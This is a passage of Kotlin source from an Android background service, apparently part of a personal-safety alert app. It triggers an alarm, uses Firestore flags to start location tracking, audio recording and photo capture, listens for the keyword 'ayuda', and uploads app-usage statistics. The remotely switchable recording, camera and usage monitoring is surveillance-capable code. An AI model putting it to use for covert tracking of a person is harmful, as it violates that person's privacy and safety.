        val mediaPlayer = MediaPlayer.create(this, R.raw.alarm_sound)
        mediaPlayer.start()
        mediaPlayer.setOnCompletionListener {
            it.release()
        }

        // 🔥 Obtener el ID del usuario y el dispositivo
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()

        val deviceDocRef = firestore.collection("users")
            .document(userId)
            .collection("devices")
            .document(deviceId)

        // 🔥 Obtener el nombre del dispositivo desde Firestore
        deviceDocRef.get()
            .addOnSuccessListener { document ->
                if (document.exists()) {
                    val deviceName = document.getString("deviceName") ?: "Desconocido"

                    // 🔥 Activar tracking y grabación
                    val updates = hashMapOf<String, Any>(
                        "trackingEnabled" to true,
                        "recordingEnabled" to true,
                        "takePhoto" to true
                    )

                    deviceDocRef.update(updates)
                        .addOnSuccessListener {
                            Log.d("BackgroundService", "trackingEnabled y recordingEnabled activados correctamente.")
                        }
                        .addOnFailureListener { e ->
                            Log.e("BackgroundService", "Error activando tracking y grabación: ${e.message}")
                        }

                    // 🔥 Insertar notificación en Firestore
                    val notificationData = hashMapOf(
                        "senderName" to deviceName,
                        "message" to getString(R.string.alert_message, deviceName),
                        "timestamp" to Timestamp.now()
                    )

                    firestore.collection("users")
                        .document(userId)
                        .collection("notifications")
                        .add(notificationData)
                        .addOnSuccessListener {
                            Log.d("BackgroundService", "Notificación de alerta registrada correctamente.")
                        }
                        .addOnFailureListener { e ->
                            Log.e("BackgroundService", "Error registrando la notificación: ${e.message}")
                        }
                } else {
                    Log.e("BackgroundService", "Documento del dispositivo no encontrado.")
                }
            }
            .addOnFailureListener { e ->
                Log.e("BackgroundService", "Error obteniendo el nombre del dispositivo: ${e.message}")
            }
    }

    private val client = OkHttpClient()

    /*  fun sendPushNotification(token: String, title: String, message: String) {
        val fcmServerKey = "TU_CLAVE_SECRETA_DE_FCM"  // 🔥 Cambia esto por tu Server Key de Firebase

        val json = JSONObject()
        val notification = JSONObject()
        val data = JSONObject()

        try {
            notification.put("title", title)
            notification.put("body", message)
            notification.put("sound", "default")  // Sonido de notificación

            data.put("click_action", "FLUTTER_NOTIFICATION_CLICK")
            data.put("type", "ALERT")

            json.put("to", token)
            json.put("notification", notification)
            json.put("data", data)

        } catch (e: Exception) {
            Log.e("FCM", "Error creando JSON: ${e.message}")
        }

        val requestBody = RequestBody.create(
            "application/json; charset=utf-8".toMediaTypeOrNull(),
            json.toString()
        )

        val request = Request.Builder()
            .url("https://fcm.googleapis.com/fcm/send")
            .post(requestBody)
            .addHeader("Authorization", "key=$fcmServerKey")  // 🔥 Token del servidor FCM
            .addHeader("Content-Type", "application/json")
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("FCM", "Error enviando notificación: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d("FCM", "Notificación enviada exitosamente")
                } else {
                    Log.e("FCM", "Error en la respuesta de FCM: ${response.message}")
                }
            }
        })
    }*/

    private fun containsKeyword(text: String): Boolean {
        // val keywords = listOf("ayuda", "emergencia", "socorro", "help") // 🔍 Lista de palabras clave a detectar
        val keywords = listOf("ayuda") // 🔍 Lista de palabras clave a detectar
        return keywords.any { text.contains(it, ignoreCase = true) }
    }

    private fun getCurrentUserFcmTokens(callback: (List<String>?) -> Unit) {
        val userId = auth.currentUser?.uid ?: return

        firestore.collection("users").document(userId).collection("tokens")
            .get()
            .addOnSuccessListener { result ->
                val tokens = mutableListOf<String>()
                for (document in result) {
                    val token = document.getString("token")
                    if (!token.isNullOrEmpty()) {
                        tokens.add(token)
                    }
                }
                if (tokens.isNotEmpty()) {
                    callback(tokens)
                } else {
                    Log.e("FCM", "No se encontraron tokens en la subcolección.")
                    callback(null)
                }
            }
            .addOnFailureListener { e ->
                Log.e("FCM", "Error obteniendo tokens FCM: ${e.message}")
                callback(null)
            }
    }

    private lateinit var wakeLock: PowerManager.WakeLock

    private fun acquireWakeLock() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApp::SpeechRecognizerWakeLock")
        wakeLock.acquire(10 * 60 * 1000L /*10 minutos*/)
    }

    private fun uploadUsageStats() {
        val stats = appUsageManager.getAppUsageStats() ?: return
        val userId = auth.currentUser?.uid ?: return
        val deviceId = getDeviceIdAsString()
        val usageRootRef = firestore.collection("users")
            .document(userId)
            .collection("devices")
            .document(deviceId)
            .collection("usage")

        val pm = applicationContext.packageManager
        val minForegroundMillis = 5 * 60 * 1000L // 5 minutos
        val filteredStats = stats.filter { it.totalTimeInForeground >= minForegroundMillis }

        for (usage in filteredStats) {
            try {
                val appInfo = pm.getApplicationInfo(usage.packageName, 0)
                val isSystemApp = (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0 ||
                                  (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
                // Si es una app de sistema, la podemos omitir o procesarla aparte.
                if (isSystemApp) {
                    Log.d("AppUsageUpload", "Skipping system app: ${usage.packageName}")
                    continue
                }

                // Extraer el tercer segmento del package name para usarlo como ID
                val segments = usage.packageName.split(".")
                val packageId = if (segments.size >= 3) segments[2] else usage.packageName

                // Construir la referencia al documento con ID packageId
                val packageUsageRef = usageRootRef.document(packageId).collection("stats")
                val data = hashMapOf(
                    "packageName" to usage.packageName,
                    "totalTimeInForeground" to usage.totalTimeInForeground,
                    "lastTimeUsed" to usage.lastTimeUsed,
                    "firstTimeStamp" to usage.firstTimeStamp,
                    "lastTimeStamp" to usage.lastTimeStamp,
                    "timestampUpload" to Date()
                )
                packageUsageRef.document("usageData").set(data, SetOptions.merge())
                    .addOnSuccessListener {
                        Log.d("AppUsageUpload", "Uploaded usage for package: ${usage.packageName} under id: $packageId")
                    }
                    .addOnFailureListener { e ->
                        Log.e("AppUsageUpload", "Failed to upload usage for ${usage.packageName}: ${e.message}")
                    }
            } catch (e: PackageManager.NameNotFoundException) {
                Log.e("AppUsageUpload", "Package not found: ${usage.packageName}")
            }
        }
    }

    private fun verificarPermisoDeUso(context: Context, requestRemote: Boolean, deviceDocRef: DocumentReference) {
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.unsafeCheckOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            context.packageName
        )

        val hasPermission = mode == AppOpsManager.MODE_ALLOWED

        if (!hasPermission || requestRemote) {
            Log.d("Permissions", "🔐 Lanzando pantalla de permisos de uso...")
            try {
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)

                // Si el permiso fue solicitado remotamente, resetea el flag
                if (requestRemote) {
                    deviceDocRef.update("requestUsagePermission", false)
                }

            } catch (e: Exception) {
                Log.e("Permissions", "❌ No se pudo abrir la pantalla de permisos de uso", e)
            }
        } else {
            Log.d("Permissions", "✅ Permiso de uso ya concedido y no se requiere acción remota")
        }
    }


    // Dentro de BackgroundService.kt
    // Receptor para activación manual (agrega el flag RECEIVER_NOT_EXPORTED)
    private val manualActivationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            Log.d("ManualActivation", "Se recibió activación manual desde el botón")
            // Actualiza en Firestore los campos trackingEnabled y recordingEnabled a true
            val userId = auth.currentUser?.uid ?: return
            val deviceId = getDeviceIdAsString()  // Asegúrate de que esta función retorne el valor correcto
            val deviceDocRef = firestore.collection("users").document(userId)
                .collection("devices").document(deviceId)
            // Define el mapa de actualizaciones con el tipo MutableMap<String, Any>
            val updates: MutableMap<String, Any> = mutableMapOf(
                "trackingEnabled" to true,
                "recordingEnabled" to true
            )
            deviceDocRef.update(updates)
                .addOnSuccessListener {
                    Log.d("ManualActivation", "Campos trackingEnabled y recordingEnabled actualizados")
                }
                .addOnFailureListener { e ->
                    Log.e("ManualActivation", "Error actualizando campos: ${e.message}")
                }
            // Llama a triggerAlarm() para activar la alarma
            triggerAlarm()
        }
    }
    override fun onDestroy() {
        Log.d("BackgroundService", "Service onDestroy called")
        unregisterReceiver(manualActivationReceiver)

        stopLocationUpdates() // 🚫 Detener actualizaciones de ubicación
        stopRecording() // 🎤 Detener grabación si está activa
        stopListening() // 🎙️ Detener reconocimiento de voz si está activo
        stopAudioMonitoring() // 🔊 Detener monitoreo de audio

        unregisterReceiver(batteryStatusReceiver) // 🔋 Detener monitoreo de batería
        unregisterReceiver(screenStateReceiver)
        // 🔊 Restaurar sonido del sistema si se había silenciado
        audioManager?.adjustStreamVolume(
            AudioManager.STREAM_SYSTEM,
            AudioManager.ADJUST_UNMUTE,
            0
        )
        stopBackgroundThread()

        // 🔋 Liberar WakeLock si estaba activo
        if (::wakeLock.isInitialized && wakeLock.isHeld) {
            wakeLock.release()
        }

        // 🎙️ Destruir `SpeechRecognizer` solo si estaba inicializado
        speechRecognizer?.destroy()
        speechRecognizer = null
        //usageHandler.removeCallbacks(usageRunnable)

        super.onDestroy()
        cameraExecutor.shutdown() // ✅ Cerrar el executor de la cámara
    }

    override fun onBind(intent: Intent?): IBinder? {
            return null
    }
}
